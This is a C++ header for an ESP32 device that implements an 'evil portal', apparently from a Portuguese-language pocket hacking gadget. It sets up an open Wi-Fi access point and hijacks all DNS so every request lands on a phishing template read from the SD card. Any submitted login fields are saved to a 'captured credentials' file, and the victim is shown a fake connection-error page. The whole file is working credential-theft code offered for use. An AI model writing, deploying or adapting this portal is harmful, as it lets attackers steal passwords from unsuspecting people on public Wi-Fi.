#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

/**
 * EvilPortal.h
 * Captive Portal com Templates em Português.
 */

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD_MMC.h>
#include "FaceHandler.h"
#include "AudioHandler.h"

class EvilPortal {
private:
    static DNSServer dnsServer;
    static AsyncWebServer server;
    static bool is_running;
    static String current_template_path;
    static int captured_count;

public:
    static void init() {
        is_running = false;
        captured_count = 0;
    }

    static void start(const char* ssid, const char* template_file) {
        if (is_running) stop();

        // Caminho ajustado para /arquivos_cartao_sd/evil_portal/
        current_template_path = String("/arquivos_cartao_sd") + String(template_file);

        Serial.printf("[Portal] Iniciando em '%s' com template '%s'\n", ssid, current_template_path.c_str());

        WiFi.mode(WIFI_AP);
        WiFi.softAP(ssid);

        dnsServer.start(53, "*", WiFi.softAPIP());

        server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
            if (SD_MMC.exists(current_template_path)) {
                request->send(SD_MMC, current_template_path, "text/html");
            } else {
                request->send(200, "text/plain", "Erro: Template nao encontrado no SD (/arquivos_cartao_sd/evil_portal).");
            }
        });

        server.onNotFound([](AsyncWebServerRequest *request){
            if (SD_MMC.exists(current_template_path)) {
                request->send(SD_MMC, current_template_path, "text/html");
            } else {
                request->send(200, "text/plain", "Portal Ativo.");
            }
        });

        server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
            String log_entry = "--- Captura: " + String(millis()) + " ---\n";
            int params = request->params();
            for(int i=0; i<params; i++){
                AsyncWebParameter* p = request->getParam(i);
                if(p->isPost()){
                    log_entry += p->name() + ": " + p->value() + "\n";
                }
            }

            // Salva em /arquivos_cartao_sd/credenciais_capturadas.txt
            File f = SD_MMC.open("/arquivos_cartao_sd/credenciais_capturadas.txt", FILE_APPEND);
            if (f) {
                f.println(log_entry);
                f.close();
                captured_count++;
                FaceHandler::setFace(FACE_HAPPY);
                AudioHandler::playWav("/success_pt.wav");
            }
            request->send(200, "text/html", "<h1>Erro de Conexao</h1><p>Tente novamente mais tarde.</p>");
        });

        server.begin();
        is_running = true;
        FaceHandler::setFace(FACE_COOL);
    }

    static void stop() {
        if (is_running) {
            dnsServer.stop();
            server.end();
            WiFi.softAPdisconnect(true);
            is_running = false;
            FaceHandler::setFace(FACE_NEUTRAL);
        }
    }

    static void loop() {
        if (is_running) {
            dnsServer.processNextRequest();
        }
    }

    static int getCapturedCount() {
        return captured_count;
    }

    static bool isRunning() {
        return is_running;
    }
};

DNSServer EvilPortal::dnsServer;
AsyncWebServer EvilPortal::server(80);
bool EvilPortal::is_running = false;
String EvilPortal::current_template_path = "";
int EvilPortal::captured_count = 0;

#endif
